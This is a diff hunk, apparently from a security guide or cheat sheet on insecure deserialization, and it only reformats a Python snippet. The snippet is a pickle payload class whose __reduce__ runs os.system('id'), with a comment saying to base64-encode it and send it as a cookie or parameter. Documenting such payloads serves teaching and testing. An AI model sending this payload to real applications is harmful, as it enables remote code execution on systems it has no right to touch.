@@ -63,13 +63,9 @@ When `enableDefaultTyping` or `@JsonTypeInfo` allows attacker-chosen types.
 Pickle executes arbitrary code during unpickling by design:
 ```python
 import pickle, os, base64
-
-
 class Exploit:
     def __reduce__(self):
-        return (os.system, ("id",))
-
-
+        return (os.system, ('id',))
 # base64 encode pickle.dumps(Exploit()) and send as cookie/param
 ```
 
